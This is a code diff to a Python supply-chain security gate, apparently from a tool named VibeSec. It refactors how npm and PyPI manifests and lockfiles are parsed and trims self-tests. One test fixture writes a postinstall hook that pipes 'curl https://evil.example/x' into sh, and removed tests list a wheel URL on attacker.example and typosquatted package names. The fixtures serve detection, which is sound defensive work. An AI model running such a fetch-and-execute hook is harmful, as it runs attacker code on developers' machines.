@@ -24,6 +24,7 @@ from pathlib import Path
 ROOT = Path(__file__).resolve().parent.parent      # VibeSec 本身：設定、清單、政策
 sys.path.insert(0, str(Path(__file__).resolve().parent))
 import gate_result  # noqa: E402  閘門結果與自產 SARIF 骨架只有一份寫法（#181）；不依賴 PyYAML
+from g1_manifests import REQUIREMENTS_RE, classify, parse_manifest, pep508  # noqa: E402  清單與鎖定檔解析，與 g1_sbom 共用（#262）
 CFG_DIR = ROOT / "config" / "slopsquat"
 TIMEOUT = 8
 WORKERS = 8                                        # registry 並行查詢數
@@ -285,7 +286,7 @@ def pypi_requires(pkg, ver):
                          f"{urllib.parse.quote(ver, safe='')}/json").get("info") or {}
     except Exception:
         return set()
-    return {canon("pypi", x[0]) for x in map(_pep508, info.get("requires_dist") or []) if x}
+    return {canon("pypi", x[0]) for x in map(pep508, info.get("requires_dist") or []) if x}
 
 def requirements_indirect(path, requires=None):
     """requirements*.txt 中由同檔其他套件宣告為相依的 (名稱小寫, 版本)，即間接相依，不做名稱相似度。
@@ -293,7 +294,7 @@ def requirements_indirect(path, requires=None):
     requires = requires or pypi_requires
     pins = []
     for line in Path(path).read_text(errors="ignore").splitlines():
-        x = _pep508(line.split(" #", 1)[0])
+        x = pep508(line.split(" #", 1)[0])
         if x and x[1]:
             pins.append(x)
     if len(pins) < 2:
@@ -435,287 +436,6 @@ def _policy():
         from vibesec_policy import Policy
         _POLICY = Policy(ROOT)
     return _POLICY
-
-PKG_RE_NPM = re.compile(r'"([@a-z0-9._/-]+)"\s*:\s*"([~^]?[0-9][^"]*)"')
-
-# PEP 508 需求字串：名稱、可選 extras、版本規格；忽略環境標記（; 之後）
-REQ_RE = re.compile(r'^\s*([A-Za-z0-9][A-Za-z0-9._-]*)\s*(?:\[[^\]]*\])?\s*(?:===?\s*([0-9][^,;\s]*))?')
-
-# 直接 URL／VCS 來源（pkg @ https://…、git+…、-e git+…）：registry 查不到，不能當成已檢查
-URL_REQ = re.compile(r'^(-e\s+)?(git\+|https?:|ssh:|svn\+|hg\+|bzr\+|file:)|\s@\s')
-
-def _pep508(req):
-    """從 PEP 508 需求字串取出 (名稱, 鎖定版本或 None)。註解／選項／本地路徑回傳 None（略過）；
-    URL／VCS 來源回傳 False（無法以 registry 驗證 → 呼叫端記 incomplete，第四次審視 S-2）。"""
-    if not isinstance(req, str):
-        return None
-    req = req.split(";", 1)[0].strip()
-    if not req or req.startswith("#"):
-        return None
-    if URL_REQ.search(req):
-        return False
-    if req.startswith(("-", ".", "/")):
-        return None
-    m = REQ_RE.match(req)
-    return (m.group(1), m.group(2)) if m else None
-
-# requirements 檔的選項行：以前 _pep508 對所有 - 開頭的行回傳 None，-r base.in 引入的套件從頭到尾沒查，
-# --index-url／--extra-index-url 指向私有 index 也照樣以公開 PyPI 的結果判定（第五次審查 G1-3）。
-REQ_PYPI_INDEXES = {"https://pypi.org/simple", "https://pypi.python.org/simple"}
-REQ_INCLUDE = re.compile(r'^(?:-r|--requirement)(?:\s*=\s*|\s+|(?=[^\s-]))(\S+)')
-REQ_SOURCE = re.compile(r'^(-i|--index-url|--extra-index-url|-f|--find-links|--no-index)\b(?:\s*=\s*|\s+)?(\S*)')
-
-def _requirements(path, boundary, seen=None):
-    """requirements 檔（含 -r 遞迴引入）→ ([(名稱, 版本)], [無法驗證的條目])。
-    -r 的檔案相對於引入它的檔案；不存在、超出 boundary（目標專案根目錄）或循環引入 → 記入無法驗證。
-    套件來源不是公開 PyPI（私有／額外 index、find-links、--no-index）→ 記入無法驗證：registry 檢查查的是 PyPI。
-    -c／--constraint 只限制版本、不安裝套件，與其他選項（--hash、--pre…）一樣略過。"""
-    path = Path(path)
-    seen = set() if seen is None else seen
-    real = path.resolve()
-    if real in seen:
-        return [], [f"{path.name}: -r 循環引入，略過重複的檔案"]
-    seen.add(real)
-    out, bad = [], []
-    for raw in path.read_text(errors="ignore").splitlines():
-        line = raw.split(" #", 1)[0].strip().rstrip("\\").strip()
-        m = REQ_INCLUDE.match(line)
-        if m:
-            ref = m.group(1)
-            inc = (path.parent / ref).resolve()
-            if "$" in ref:
-                bad.append(f"{path.name}: -r {ref[:60]}（含環境變數，無法確定引入的檔案）")
-            elif boundary not in inc.parents:
-                bad.append(f"{path.name}: -r {ref[:60]}（超出目標專案，未檢查）")
-            elif not inc.is_file():
-                bad.append(f"{path.name}: -r {ref[:60]}（檔案不存在，其中的套件未檢查）")
-            else:
-                e, b = _requirements(inc, boundary, seen)
-                out += e; bad += b
-            continue
-        m = REQ_SOURCE.match(line)
-        if m:
-            opt, url = m.group(1), m.group(2).rstrip("/")
-            if not (opt in ("-i", "--index-url") and url in REQ_PYPI_INDEXES):
-                bad.append(f"{path.name}: {line[:80]}（套件來源不是公開 PyPI，registry 檢查不代表實際安裝的套件）")
-            continue
-        x = _pep508(line)
-        if x:
-            out.append(x)
-        elif x is False:
-            bad.append(f"{path.name}: {line[:60]}")
-    return out, bad
-
-def _toml(path):
-    try:
-        import tomllib
-    except ImportError:  # Python < 3.11
-        return None
-    try:
-        return tomllib.loads(path.read_text(errors="ignore"))
-    except Exception:
-        return None
-
-def _pyproject_deps(data):
-    """PEP 621 [project]、[dependency-groups]（PEP 735）與 Poetry 的相依。不含 build-system。"""
-    reqs = []
-    proj = data.get("project") or {}
-    reqs += proj.get("dependencies") or []
-    for group in (proj.get("optional-dependencies") or {}).values():
-        reqs += group or []
-    for group in (data.get("dependency-groups") or {}).values():
-        reqs += [r for r in (group or []) if isinstance(r, str)]   # 略過 {include-group = ...}
-    out, bad = [], []
-    for r in reqs:
-        x = _pep508(r)
-        if x:
-            out.append(x)
-        elif x is False:
-            bad.append(str(r))
-    poetry = (data.get("tool") or {}).get("poetry") or {}
-    tables = [poetry.get("dependencies") or {}, poetry.get("dev-dependencies") or {}]
-    tables += [(g or {}).get("dependencies") or {} for g in (poetry.get("group") or {}).values()]
-    for table in tables:
-        for name, spec in table.items():
-            if name.lower() == "python":
-                continue
-            if isinstance(spec, dict) and any(k in spec for k in ("git", "url", "path", "file")):
-                bad.append(f"{name}（{', '.join(k for k in ('git', 'url', 'path', 'file') if k in spec)}）")
-            else:
-                out.append((name, None))
-    return out, bad
-
-PYPI_INDEXES = ("https://pypi.org/simple", "https://pypi.org/simple/", "https://pypi.org/pypi", "https://pypi.org/pypi/")
-ARCHIVE_RE = re.compile(r"\.(whl|zip|tar\.gz|tgz|tar\.bz2)$", re.I)
-
-def _lock_packages(data):
-    """uv.lock / poetry.lock 的 [[package]] → ([(名稱, 版本)], [無法以 registry 驗證的條目])。
-    略過本地專案（editable / virtual / directory、非封存檔的 path，即專案自己的程式碼）。git、url、本地封存檔、
-    私有 registry 來源查公開 PyPI 不代表裝的是那一份 → 回報給呼叫端記 incomplete（同 npm_lock 的非 registry 條目）。"""
-    out, bad = [], []
-    for pkg in data.get("package") or []:
-        if not isinstance(pkg, dict) or not pkg.get("name"):
-            continue
-        name, src = pkg["name"], pkg.get("source") or {}
-        kind = src.get("type")                       # poetry.lock：git／url／file／directory／legacy（私有 index）
-        if any(k in src for k in ("editable", "virtual", "directory")) or kind == "directory" \
-                or ("path" in src and not ARCHIVE_RE.search(str(src["path"]))):
-            continue
-        why = None
-        if "git" in src or kind == "git":
-            why = "git"
-        elif kind == "url" or ("url" in src and kind != "legacy"):
-            why = "url"
-        elif "path" in src or kind == "file":
-            why = "本地封存檔"
-        elif "registry" in src and str(src["registry"]) not in PYPI_INDEXES:
-            why = f"registry {src['registry']}"
-        elif kind == "legacy" and str(src.get("url") or "") not in PYPI_INDEXES:
-            why = f"私有 index {src.get('url') or src.get('reference') or '?'}"
-        if why:
-            bad.append(f"{name}（{why}）")
-        else:
-            out.append((name, pkg.get("version")))
-    return out, bad
-
-DEP_SECTIONS = ("dependencies", "devDependencies", "optionalDependencies", "peerDependencies")
-NPM_REGISTRIES = ("https://registry.npmjs.org/", "https://registry.yarnpkg.com/")
-SEMVER = re.compile(r"^\d+\.\d+\.\d+")
-
-def npm_lock(path):
-    """package-lock.json（lockfileVersion 1–3）→ ([(名稱, 版本, 是否直接相依)], [無法以 registry 驗證的條目])。
-
-    v2/v3 讀 packages（鍵為 node_modules/…，名稱取最後一段；別名以 name 欄位為實名）；v1 遞迴讀 dependencies
-    （別名寫成 version: npm:<實名>@<版本>）。略過 workspace 連結（link: true，即專案自己的程式碼）。
-    resolved 不在 npm registry（git、file、tarball URL、私有 registry）或版本不是 semver 的條目，
-    無法以 registry 驗證 → 回報給呼叫端記 incomplete，不當成已檢查。
-    直接相依：根目錄與 workspace 宣告的相依（v1 取同目錄的 package.json）；讀不到時全部視為直接相依（從嚴）。"""
-    try:
-        data = json.loads(Path(path).read_text(errors="ignore"))
-    except (OSError, ValueError):
-        return [], ["整份檔案無法解析"]
-    out, bad = [], []
-
-    def add(key, name, ver, meta, direct):
-        resolved = meta.get("resolved")
-        if (resolved and not str(resolved).startswith(NPM_REGISTRIES)) or not SEMVER.match(ver):
-            bad.append(key)
-        else:
-            out.append((name, ver, direct))
-
-    pkgs = data.get("packages") if isinstance(data, dict) else None
-    if isinstance(pkgs, dict):
-        direct = set()
-        for key, meta in pkgs.items():
-            if "node_modules/" not in key and isinstance(meta, dict):
-                for sec in DEP_SECTIONS:
-                    direct |= set(meta.get(sec) or {})
-        for key, meta in pkgs.items():
-            if "node_modules/" not in key or not isinstance(meta, dict) or meta.get("link"):
-                continue
-            short = key.rsplit("node_modules/", 1)[1]
-            add(key, meta.get("name") or short, str(meta.get("version") or ""), meta,
-                key == f"node_modules/{short}" and short in direct)
-        return out, bad
-    try:
-        pj = json.loads(Path(path).with_name("package.json").read_text(errors="ignore"))
-        direct = set().union(*(set(pj.get(sec) or {}) for sec in DEP_SECTIONS))
-    except (OSError, ValueError, AttributeError):
-        direct = None
-
-    def walk(deps, prefix):
-        for name, meta in (deps or {}).items():
-            if not isinstance(meta, dict):
-                continue
-            real, ver = name, str(meta.get("version") or "")
-            if ver.startswith("npm:"):
-                real, _, ver = ver[4:].rpartition("@")
-            add(prefix + name, real, ver, meta, direct is None or (not prefix and name in direct))
-            walk(meta.get("dependencies"), f"{prefix}{name} > ")
-    walk(data.get("dependencies") if isinstance(data, dict) else None, "")
-    return out, bad
-
-NPM_EXACT = re.compile(r'^[~^=]?v?(\d+\.\d+\.\d+(?:[-+][0-9A-Za-z.-]+)?)$')
-NPM_NONREGISTRY = re.compile(r'^(git\+|git:|github:|gitlab:|bitbucket:|gist:|https?:|ssh:|file:|link:|workspace:|\.|/)')
-
-def _npm_spec(name, spec):
-    """package.json 的版本規格 → (實名, 鎖定版本或 None, 無法驗證的原因或 None)。
-    npm:<實名>@<版本> 別名以實名查（安裝的是實名）；git／URL／本地路徑不是 registry 來源 → 無法驗證；
-    tag／範圍（latest、*、>=1 <2）→ 版本 None，以 registry 最新版做冷卻期與 hook 檢查。"""
-    spec = str(spec).strip()
-    if spec.startswith("npm:"):
-        real, _, ver = spec[4:].rpartition("@")
-        if not real:
-            real, ver = ver, ""
-        name, spec = real, ver
-    if NPM_NONREGISTRY.match(spec) or "/" in spec:
-        return name, None, f"{name}: {spec!r} 不是 npm registry 版本（git／URL／本地路徑）"
-    m = NPM_EXACT.match(spec)
-    return name, (m.group(1) if m else None), None
-
-def parse_manifest(paths):
-    """回傳 ([(ecosystem, name, version)], [無法驗證或無法解析的條目])。
-    無法解析的檔、非 registry 來源的條目都回報，不靜默略過（incomplete ≠ pass，第四次審視 S-1／S-2）。"""
-    out, bad = [], []
-    for p in paths:
-        p = Path(p)
-        if not p.exists() or UNPARSED_RE.search(p.name):
-            continue
-        text = p.read_text(errors="ignore")
-        if p.name in ("package-lock.json", "npm-shrinkwrap.json"):
-            e, b = npm_lock(p)
-            out += [("npm", n, v) for n, v, _ in e]
-            bad += [f"{p.name}: {x}" for x in b]
-        elif p.name == "package.json" or p.name.endswith(".json") and "package" in p.name:
-            try:
-                j = json.loads(text)
-            except ValueError as e:
-                bad.append(f"{p.name}: JSON 無法解析（{type(e).__name__}）"); continue
-            if not isinstance(j, dict):
-                bad.append(f"{p.name}: 不是 JSON 物件"); continue
-            for sec in DEP_SECTIONS:
-                deps = j.get(sec) or {}
-                if not isinstance(deps, dict):
-                    bad.append(f"{p.name}: {sec} 不是物件"); continue
-                for name, spec in deps.items():
-                    real, ver, why = _npm_spec(name, spec)
-                    if why:
-                        bad.append(f"{p.name} {sec}.{why}")
-                    else:
-                        out.append(("npm", real, ver))
-        elif p.name == "pyproject.toml":
-            data = _toml(p)
-            if data is None:
-                bad.append(f"{p.name}: TOML 無法解析（或 tomllib 缺席）"); continue
-            e, b = _pyproject_deps(data)
-            out += [("pypi", n, v) for n, v in e]
-            bad += [f"{p.name}: {x}" for x in b]
-        elif p.name in ("uv.lock", "poetry.lock"):
-            data = _toml(p)
-            if data is None:
-                bad.append(f"{p.name}: TOML 無法解析（或 tomllib 缺席）"); continue
-            e, b = _lock_packages(data)
-            out += [("pypi", n, v) for n, v in e]
-            bad += [f"{p.name}: {x}" for x in b]
-        elif REQUIREMENTS_RE.search(p.as_posix()):
-            root = TARGET.resolve()
-            e, b = _requirements(p, root if root in p.resolve().parents else p.resolve().parent)
-            out += [("pypi", n, v) for n, v in e]
-            bad += b
-        else:
-            # 被當成 manifest 卻沒有對應的解析器：套件一個都沒查，不能當成「沒有相依」（incomplete ≠ pass）
-            bad.append(f"{p.name}: 沒有對應的解析器，其中的套件未檢查")
-    # 去重
-    seen, uniq = set(), []
-    for eco, n, v in out:
-        k = (eco, n.lower(), v)
-        if k not in seen:
-            seen.add(k); uniq.append((eco, n, v))
-    return uniq, bad
-
-def parse_added(paths):
-    """回傳 [(ecosystem, name, version)]（無法驗證的條目見 parse_manifest）。"""
-    return parse_manifest(paths)[0]
 
 def self_install_hooks(path):
     """專案自己的 package.json scripts（preinstall／postinstall…）也要查外連與讀憑證（SKILL.md 步驟 1）。"""
@@ -867,14 +587,6 @@ def staged_files():
         return None, f"git diff --cached 失敗（exit {r.returncode}：{(r.stderr.strip().splitlines() or ['?'])[0][:120]}）"
     return [l for l in r.stdout.splitlines() if l.strip()], None
 
-# requirements 檔：檔名含 requirements 的 .txt（requirements-dev.txt、locks/python-requirements.txt），或 requirements/ 目錄下的
-# .txt（requirements/base.txt）。選檔與解析共用這一條：以前選檔對整段路徑比對、解析只看檔名，requirements/base.txt
-# 被選進來卻一個套件都沒查，G1 照樣 pass。
-REQUIREMENTS_RE = re.compile(r'(?:[^/]*requirements[^/]*|(?:^|/)requirements/(?:[^/]+/)*[^/]+)\.txt$')
-MANIFEST_RE = re.compile(r'(package(-lock)?\.json|npm-shrinkwrap\.json|pnpm-lock\.yaml|yarn\.lock|pyproject\.toml|poetry\.lock|uv\.lock|Pipfile(\.lock)?|setup\.py|setup\.cfg)$'
-                         r'|' + REQUIREMENTS_RE.pattern)
-# 有 manifest 樣式但尚無解析器的檔：其中的套件無法逐一檢查 → incomplete（不是 pass；以前 Pipfile／setup.py 根本不被當 manifest）
-UNPARSED_RE = re.compile(r'(pnpm-lock\.yaml|yarn\.lock|Pipfile(\.lock)?|setup\.py|setup\.cfg)$')
 # 全量掃描（--target、非 git 目錄）時略過的目錄：安裝產物與快取，不是專案宣告的相依
 SKIP_DIRS = {".git", "node_modules", ".venv", "venv", "__pycache__", ".tox", ".mypy_cache", ".pytest_cache", "dist", "build"}
 
@@ -1011,9 +723,13 @@ def git_show(ref, path):
     except Exception:
         return None
 
+def _entries(path):
+    """清單 → [(eco, name, version)]。無法驗證的條目與無解析器的檔由 main 另外用 parse_manifest 取得並回報，這裡只要套件。"""
+    return [(d.eco, d.name, d.version) for d in parse_manifest([path], root=TARGET).entries]
+
 def added_packages(path, base):
     """diff-aware：只回傳相對 base 新增或改版的 (eco, name, version)。base 為 None 時回傳全部。"""
-    head = parse_added([path])
+    head = _entries(path)
     if not base:
         return head
     old_text = git_show(base, path)
@@ -1023,7 +739,7 @@ def added_packages(path, base):
     with tempfile.TemporaryDirectory() as d:
         old = Path(d) / Path(path).name
         old.write_text(old_text)
-        before = {(e, n.lower(), v) for e, n, v in parse_added([old])}
+        before = {(e, n.lower(), v) for e, n, v in _entries(old)}
     return [(e, n, v) for e, n, v in head if (e, n.lower(), v) not in before]
 
 LEVEL = {"blocking": "error", "advisory": "warning"}
@@ -1378,21 +1094,6 @@ def selftest():
                 "packages/ws-local": {"version": "0.1.0"}}}
             (D / "web").mkdir()
             (D / "web/package-lock.json").write_text(json.dumps(lock))
-            entries, bad = npm_lock(D / "web/package-lock.json")
-            if sorted(entries) != [("loadsh", "0.0.4", False), ("playwright-core", "1.63.0", False), ("playwrigth", "1.0.0", True),
-                                   ("strip-ansi", "6.0.1", False), ("strip-ansi", "6.0.1", True)] or bad != ["node_modules/gitdep"]:
-                fails.append(f"package-lock v3 解析（得到 {sorted(entries)}，無法驗證 {bad}）")
-            v1 = {"lockfileVersion": 1, "dependencies": {
-                "left-pad": {"version": "1.3.0", "resolved": reg("left-pad", "1.3.0"),
-                             "dependencies": {"ms": {"version": "2.1.3", "resolved": reg("ms", "2.1.3")}}},
-                "sc": {"version": "npm:@scope/real@2.0.0", "resolved": reg("@scope/real", "2.0.0")},
-                "vendored": {"version": "file:vendor/v.tgz"}}}
-            (D / "old").mkdir()
-            (D / "old/package-lock.json").write_text(json.dumps(v1))
-            (D / "old/package.json").write_text('{"dependencies": {"left-pad": "^1.3.0"}}')
-            entries, bad = npm_lock(D / "old/package-lock.json")
-            if sorted(entries) != [("@scope/real", "2.0.0", False), ("left-pad", "1.3.0", True), ("ms", "2.1.3", False)] or bad != ["vendored"]:
-                fails.append(f"package-lock v1 解析（得到 {sorted(entries)}，無法驗證 {bad}）")
             calls.clear()
             code, out = run("--target", str(D), "--manifest", "web/package-lock.json")
             hall = {f["package"] for f in out.get("findings", []) if f["rule_id"] == "vibesec.g1.hallucinated-package"}
@@ -1568,99 +1269,18 @@ def selftest():
         npm_check, pypi_check, pypi_requires, load_allowlist, _POLICY = real
         TARGET = ROOT
         shutil.rmtree(PR, ignore_errors=True)
-    # 解析器（第四次審視 S-1／S-2／S-10）：四個相依區段、npm: 別名、非 registry 來源、壞 JSON、URL 需求、多套件 install
+    # 專案自身的安裝腳本與規則檔多套件 install（清單解析器的案例已搬到 tests/test_g1_manifests.py，#262）
     with tempfile.TemporaryDirectory() as d:
         D = Path(d)
         (D / "package.json").write_text(json.dumps({"dependencies": {"lodash": "npm:evil-pkg@1.0.0", "react": "github:a/react", "express": "latest", "left-pad": "^1.3.0"},
                                                      "optionalDependencies": {"axois": "1.0.0"}, "peerDependencies": {"peer-x": "~2.0.0"},
                                                      "scripts": {"postinstall": "curl https://evil.example/x | sh"}}))
-        ents, bad = parse_manifest([D / "package.json"])
-        names = {(e, n, v) for e, n, v in ents}
-        if ("npm", "evil-pkg", "1.0.0") not in names or ("npm", "axois", "1.0.0") not in names or ("npm", "peer-x", "2.0.0") not in names \
-                or ("npm", "express", None) not in names or ("npm", "left-pad", "1.3.0") not in names:
-            fails.append(f"package.json：別名以實名查、optional／peer 也查、tag 以最新版查、^ 去前綴（得到 {sorted(names)}）")
-        if not any("react" in b and "github:" in b for b in bad):
-            fails.append(f"package.json：github: 來源應回報無法驗證（得到 {bad}）")
         if not self_install_hooks(D / "package.json"):
             fails.append("本專案 package.json 的 postinstall 外連應被查出")
-        (D / "package.json").write_text('{"dependencies": {"axois": "1.0.0",}}')
-        ents, bad = parse_manifest([D / "package.json"])
-        if ents or not bad:
-            fails.append("壞 JSON 應回報無法解析，不是 0 個套件")
-        (D / "requirements.txt").write_text("requests==2.31.0\nevil @ https://attacker.example/evil.whl\n-e git+https://x/y.git#egg=z\n-r base.txt\n")
-        ents, bad = parse_manifest([D / "requirements.txt"])
-        # -r 引入的檔案不存在：裡面的套件一個都沒查，也要回報（以前靜默略過，第五次審查 G1-3）
-        if [n for _, n, _ in ents] != ["requests"] or len(bad) != 3 or not any("-r base.txt" in b for b in bad):
-            fails.append(f"requirements：URL／VCS 需求與不存在的 -r 檔都應回報無法驗證（得到 {ents} / {bad}）")
-        # -r／--requirement 遞迴引入：引入檔的套件要查到（含 .in、子目錄、= 與緊貼寫法），循環與超出目標專案要回報
-        (D / "reqs").mkdir(exist_ok=True)
-        (D / "reqs/base.in").write_text("evilpkgxyz==1.0.0\n-r ../requirements-dev.txt\n")
-        (D / "requirements-dev.txt").write_text("pytest==8.0.0\n--requirement=reqs/extra.txt\n-rreqs/base.in\n")
-        (D / "reqs/extra.txt").write_text("httpx==0.27.0 \\\n    --hash=sha256:00\n-c constraints.txt\n--pre\n")
-        (D / "requirements.txt").write_text("requests==2.31.0\n-r reqs/base.in  # 共用\n-r ../../outside.txt\n")
-        ents, bad = parse_manifest([D / "requirements.txt"])
-        names = sorted(n for _, n, _ in ents)
-        if names != ["evilpkgxyz", "httpx", "pytest", "requests"]:
-            fails.append(f"requirements：-r／--requirement= 引入的套件都要查（得到 {names}）")
-        if not any("循環引入" in b for b in bad) or not any("超出目標專案" in b for b in bad) or len(bad) != 2:
-            fails.append(f"requirements：-r 循環引入與超出目標專案要回報，-c／--pre／--hash 照常略過（得到 {bad}）")
-        # 套件來源不是公開 PyPI → 無法驗證；明確指定公開 PyPI 不算
-        for line, want in [("--index-url https://pypi.org/simple/", 0), ("-i https://pypi.python.org/simple", 0),
-                           ("--index-url https://pypi.internal.example/simple", 1), ("-i https://evil.example/simple", 1),
-                           ("--extra-index-url https://pypi.internal.example/simple", 1),
-                           ("--extra-index-url https://pypi.org/simple", 1),   # 額外 index 一律回報：相依混淆的典型入口
-                           ("--index-url=https://priv.example/simple", 1), ("-f ./wheels", 1), ("--find-links=https://x/", 1),
-                           ("--no-index", 1), ("--trusted-host pypi.internal.example", 0)]:
-            (D / "requirements.txt").write_text(f"{line}\nrequests==2.31.0\n")
-            ents, bad = parse_manifest([D / "requirements.txt"])
-            if [n for _, n, _ in ents] != ["requests"] or len(bad) != want:
-                fails.append(f"requirements：「{line}」應回報 {want} 筆無法驗證（得到 {bad}）")
-        (D / "pyproject.toml").write_text('[project]\ndependencies = ["fastapi", "evil @ git+https://x/y.git"]\n')
-        ents, bad = parse_manifest([D / "pyproject.toml"])
-        if [n for _, n, _ in ents] != ["fastapi"] or len(bad) != 1:
-            fails.append(f"pyproject：URL 需求應回報無法驗證（得到 {ents} / {bad}）")
-        (D / "pyproject.toml").write_text('[project\nbroken')
-        if parse_manifest([D / "pyproject.toml"]) != ([], ["pyproject.toml: TOML 無法解析（或 tomllib 缺席）"]):
-            fails.append("壞 TOML 應回報無法解析")
         (D / "AGENTS.md").write_text("先 pip install requests fastapi-auth-helperz --upgrade\n再 npm install express axois@1.2 && npm run x\n")
         ment = {(e, n) for e, n, _ in rule_file_mentions(D / "AGENTS.md")}
         if ment != {("pypi", "requests"), ("pypi", "fastapi-auth-helperz"), ("npm", "express"), ("npm", "axois")}:
             fails.append(f"規則檔同一行多個套件都要查（得到 {sorted(ment)}）")
-        if not MANIFEST_RE.search("Pipfile") or not UNPARSED_RE.search("setup.py") or not MANIFEST_RE.search("npm-shrinkwrap.json"):
-            fails.append("Pipfile／setup.py 應被當成尚無解析器的 manifest；npm-shrinkwrap 應被當成鎖定檔")
-        # requirements/ 子目錄：以前選檔會選到 requirements/base.txt，解析卻只看檔名 base.txt，一個套件都沒查 → pass
-        (D / "requirements").mkdir()
-        (D / "requirements/base.txt").write_text("requests==2.31.0\nreqeusts-helperz==0.0.1\n")
-        if not MANIFEST_RE.search("requirements/base.txt") or not MANIFEST_RE.search("requirements/prod/web.txt"):
-            fails.append("requirements/ 目錄下的 .txt 應被當成 manifest")
-        if MANIFEST_RE.search("docs/notes.txt") or MANIFEST_RE.search("requirements/README.md"):
-            fails.append("requirements 以外的 .txt、requirements/ 下的非 .txt 不是 manifest")
-        ents, bad = parse_manifest([D / "requirements/base.txt"])
-        if sorted(n for _, n, _ in ents) != ["reqeusts-helperz", "requests"] or bad:
-            fails.append(f"requirements/base.txt 的套件都要解析出來（得到 {ents} / {bad}）")
-        # 被選為 manifest 卻沒有解析器 → 回報無法驗證（不是 0 個套件、沒有問題）
-        (D / "weird-package.lock").write_text("whatever\n")
-        if parse_manifest([D / "weird-package.lock"])[1] != ["weird-package.lock: 沒有對應的解析器，其中的套件未檢查"]:
-            fails.append("沒有解析器的 manifest 應回報無法驗證")
-        # uv.lock／poetry.lock：git、url、本地封存檔、私有 registry 來源不查公開 PyPI，回報無法驗證
-        (D / "uv.lock").write_text(
-            'version = 1\n[[package]]\nname = "proj"\nversion = "0.1.0"\nsource = { editable = "." }\n'
-            '[[package]]\nname = "requests"\nversion = "2.32.0"\nsource = { registry = "https://pypi.org/simple" }\n'
-            '[[package]]\nname = "gitdep"\nversion = "1.0.0"\nsource = { git = "https://github.com/x/gitdep?rev=abc" }\n'
-            '[[package]]\nname = "urldep"\nversion = "1.0.0"\nsource = { url = "https://x.example/urldep-1.0.0.tar.gz" }\n'
-            '[[package]]\nname = "whl"\nversion = "1.0.0"\nsource = { path = "vendor/whl-1.0.0-py3-none-any.whl" }\n'
-            '[[package]]\nname = "internal"\nversion = "1.0.0"\nsource = { registry = "https://pypi.corp.example/simple" }\n')
-        ents, bad = parse_manifest([D / "uv.lock"])
-        if [n for _, n, _ in ents] != ["requests"] or len(bad) != 4:
-            fails.append(f"uv.lock：git／url／封存檔／私有 registry 不查公開 PyPI，回報無法驗證（得到 {ents} / {bad}）")
-        (D / "poetry.lock").write_text(
-            '[[package]]\nname = "requests"\nversion = "2.32.0"\n'
-            '[[package]]\nname = "gitdep"\nversion = "1.0.0"\n[package.source]\ntype = "git"\nurl = "https://github.com/x/g.git"\n'
-            '[[package]]\nname = "internal"\nversion = "1.0.0"\n[package.source]\ntype = "legacy"\nurl = "https://pypi.corp.example/simple"\nreference = "corp"\n'
-            '[[package]]\nname = "local"\nversion = "0.1.0"\n[package.source]\ntype = "directory"\nurl = "../local"\n')
-        ents, bad = parse_manifest([D / "poetry.lock"])
-        if [n for _, n, _ in ents] != ["requests"] or len(bad) != 2:
-            fails.append(f"poetry.lock：git／私有 index 回報無法驗證、本地目錄略過（得到 {ents} / {bad}）")
         # 規則檔：讀設定的 glob（含 .cursor/rules/**/*.mdc）；uv add／poetry add／bun add 也是安裝指令
         for p, want in ((".cursor/rules/a.mdc", True), (".cursor/rules/x/y.mdc", True), ("CLAUDE.md", True),
                         ("sub/AGENTS.md", True), ("docs/x.md", True), ("notes.mdc", False), ("app/main.py", False)):
@@ -1930,7 +1550,7 @@ def main(argv, policy_root=ROOT):
         pre_incomplete.append(f"指定的檔案不存在，未檢查：{', '.join(missing)}")
     gone, unknown = [], []
     for f in dict.fromkeys(changed):
-        is_m = bool(MANIFEST_RE.search(f))
+        is_m = classify(f).kind != "other"
         is_r = not is_m and is_rule_file(f) and not (f.startswith("config/slopsquat/") and not external_target())
         if not (is_m or is_r):
             continue
@@ -1982,18 +1602,18 @@ def main(argv, policy_root=ROOT):
     targets += [(r, rule_file_mentions(r), True) for r in rule_files]
 
     findings, incomplete = [], list(pre_incomplete) + config_problems()
-    unparsed = [rel_path(m) for m in manifests if UNPARSED_RE.search(Path(m).name)]
+    parsed = {m: parse_manifest([m], root=TARGET) for m in manifests}      # 每個清單解析一次；無解析器的檔由解析模組回報
+    unparsed = [rel_path(u) for m in manifests for u in parsed[m].unparsed]
     if unparsed:
         incomplete.append(f"鎖定檔尚無解析器，其中的套件未逐一檢查：{', '.join(unparsed)}")
     indirect = {}       # package-lock.json、requirements 鎖定檔 → 只以間接相依出現的 (名稱小寫, 版本)：不做名稱相似度
     for m in manifests:
-        _, bad = parse_manifest([m])
+        bad = parsed[m].bad
         if bad:
             incomplete.append(f"{rel_path(m)}：{len(bad)} 筆無法解析或不是 registry 來源，未檢查"
                               f"（{', '.join(bad[:5])}{' …' if len(bad) > 5 else ''}）")
         if Path(m).name in ("package-lock.json", "npm-shrinkwrap.json"):
-            entries, _ = npm_lock(m)
-            indirect[m] = {(n.lower(), v) for n, v, d in entries if not d} - {(n.lower(), v) for n, v, d in entries if d}
+            indirect[m] = {(d.name.lower(), d.version) for d in parsed[m].entries if d.direct is False}
         elif REQUIREMENTS_RE.search(Path(m).as_posix()):
             indirect[m] = requirements_indirect(m)
 
